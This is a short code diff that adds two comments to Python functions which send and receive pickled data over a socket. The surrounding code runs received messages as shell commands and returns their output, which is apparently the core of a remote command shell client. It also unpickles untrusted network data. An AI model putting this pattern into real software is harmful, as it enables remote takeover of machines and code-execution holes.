@@ -20,6 +20,8 @@ def popenExecution(data):
     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     return str(command.stdout.read() + command.stderr.read(), "utf-8")
 
+
+#   --> Send a payload to the server
 def send(socket, payload):
     try:
         socket.send(pickle.dumps(payload))
@@ -27,7 +29,7 @@ def send(socket, payload):
         print(e)
         time.sleep(1)
         
-
+#   --> simple receive function, expects a command, calls for a send right after
 def receive(socket):
     try:
         message = pickle.loads(socket.recv(2048))
